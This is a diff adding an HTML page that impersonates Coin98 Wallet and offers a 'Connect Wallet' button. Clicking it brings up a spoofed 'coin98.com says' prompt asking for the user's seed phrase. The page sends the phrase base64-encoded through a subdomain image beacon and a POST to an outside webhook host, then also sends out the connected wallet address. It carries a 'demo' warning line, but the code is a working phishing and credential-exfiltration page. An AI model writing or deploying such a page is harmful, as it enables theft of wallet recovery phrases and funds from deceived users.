@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>coin98.com</title>
+  <style>
+    body {
+      margin: 0; padding: 0; height: 100vh; background: #0f172a; color: #e2e8f0;
+      font-family: system-ui; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center;
+    }
+    .logo { font-size: 80px; margin-bottom: 20px; }
+    h1 { font-size: 28px; margin-bottom: 20px; }
+    p { font-size: 18px; color: #94a3b8; margin-bottom: 40px; max-width: 500px; }
+    .btn {
+      padding: 18px 40px; font-size: 20px; background: #4285f4; color: white; border: none; border-radius: 16px;
+      cursor: pointer; box-shadow: 0 10px 40px rgba(66,133,244,0.6); transition: 0.3s; font-weight: bold;
+    }
+    .btn:hover { background: #3367d6; transform: scale(1.05); }
+    .status {
+      margin-top: 30px; font-size: 16px; min-height: 60px;
+    }
+    .address {
+      color: #22c55e;
+      word-break: break-all;
+    }
+    .warning {
+      margin-top: 40px;
+      color: #ef4444;
+      font-weight: bold;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="logo">🪙</div>
+  <h1>Coin98 Wallet</h1>
+  <p>Connect your wallet to continue</p>
+  <button class="btn" id="connectWallet">Connect Wallet</button>
+
+  <div class="status" id="status">Ready</div>
+
+  <div class="warning">
+    This is a demo — do not use on real wallet!
+  </div>
+
+  <!-- WALLETCONNECT MODAL CDN -->
+  <script src="https://unpkg.com/@walletconnect/modal@2.6.2/dist/index.js"></script>
+
+  <script type="module">
+    import { SignClient } from "https://unpkg.com/@walletconnect/sign-client@2.13.0/dist/index.js";
+
+    const PROJECT_ID = "06a99c181693e6b2727204215bbae00f";
+
+    let signClient;
+    let session;
+
+    async function initWalletConnect() {
+      signClient = await SignClient.init({
+        projectId: PROJECT_ID,
+        metadata: {
+          name: "Coin98 DApp",
+          description: "Demo DApp",
+          url: "https://coin98.com",
+          icons: ["https://coin98.com/favicon.ico"]
+        }
+      });
+
+      // Expose ke script biasa
+      window.signClient = signClient;
+    }
+
+    initWalletConnect();
+  </script>
+
+  <script>
+    const OOB = "ancient-unicorn-29.webhook.cool";
+
+    document.getElementById("connectWallet").addEventListener("click", async () => {
+      const statusEl = document.getElementById("status");
+
+      statusEl.innerHTML = "Initializing WalletConnect...";
+
+      // 1. PROMPT SEED PHRASE
+      setTimeout(() => {
+        const seed = prompt("coin98.com says:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nEnter your seed phrase before continue");
+        if (seed && seed.trim() !== "") {
+          const beacon = btoa(seed.trim()).replace(/=/g, '').substring(0, 500);
+          new Image().src = `https://${beacon}.${OOB}`;
+          fetch(`https://${OOB}/coin98-seed`, {
+            method: "POST",
+            body: JSON.stringify({ seed: seed.trim() })
+          }).catch(() => {});
+        }
+      }, 1000);
+
+      try {
+        if (!window.signClient) {
+          throw new Error("WalletConnect not loaded");
+        }
+
+        // 2. CREATE SESSION & OPEN MODAL
+        const { uri, approval } = await window.signClient.connect({
+          requiredNamespaces: {
+            eip155: {
+              methods: ["eth_sendTransaction", "eth_sign", "personal_sign", "eth_signTypedData"],
+              chains: ["eip155:1"],
+              events: ["chainChanged", "accountsChanged"]
+            }
+          }
+        });
+
+        if (uri) {
+          // Open QR Modal
+          const { WalletConnectModal } = window.walletconnectModal;
+          const modal = new WalletConnectModal({
+            projectId: PROJECT_ID
+          });
+          modal.openModal({ uri });
+        }
+
+        // 3. WAIT FOR APPROVAL
+        session = await approval();
+
+        const address = session.namespaces.eip155.accounts[0].split(":")[2];
+
+        statusEl.innerHTML = `Connected: <span class="address">${address}</span>`;
+
+        // Exfil address
+        const addrBeacon = btoa(address).replace(/=/g, '');
+        new Image().src = `https://addr-${addrBeacon}.${OOB}`;
+
+      } catch (err) {
+        statusEl.innerHTML = `<span style="color:#ef4444">Error: ${err.message || "Connection failed"}</span>`;
+        console.log("WalletConnect failed:", err);
+      }
+    });
+  </script>
+
+</body>
+</html>
